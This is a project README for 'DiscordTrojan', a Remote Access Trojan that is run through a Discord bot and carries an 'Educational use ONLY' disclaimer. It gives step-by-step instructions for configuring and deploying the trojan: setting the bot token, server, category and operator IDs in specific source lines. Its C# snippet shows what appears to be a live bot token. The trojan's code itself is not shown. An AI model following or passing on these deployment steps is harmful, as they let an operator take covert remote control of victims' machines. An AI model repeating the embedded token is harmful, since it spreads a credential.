# Discontinued

Thank you to anyone who liked this project, if you want to update it yourself feel free to fork it! 
Have a nice night!

# DiscordTrojan

This is a trojan horse designed for Educational use ONLY. This is a Remote Access Trojan that functions through discord instead of a ip.


## How To Use

Navigate to line 92 and set your discord bot's token. Then invite the bot to the discord. Create a category, a global clients channel, and then set replace line 94 with your server's id. Then copy your category's id then replace it at line 93. After that, grab your own id, and or anyone elses id and add them at line 95.


It should look like this:
```csharp
Program.token = "Bot ODIzMzU0Mjg2NTEwNTcxNTgx.YFfmbw.ktivWpMcj3xXL1Mhex-Nd32-FzI"; //Bot Token
Program.commanding_parent = 823353814232465428UL; //Category inside the server's id.
Program.commanding_guild = 326353814232465449UL; //Guid ID
Program.commanding_users.Add(810393427677151222UL);
```

## How to copy id's

Go to Settings>Appearance>Developer Mode, then enable that. Right click something you want to copy then hit copy id.
 
## Changelog
- Made this public, March 23rd at 12:05 PM

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
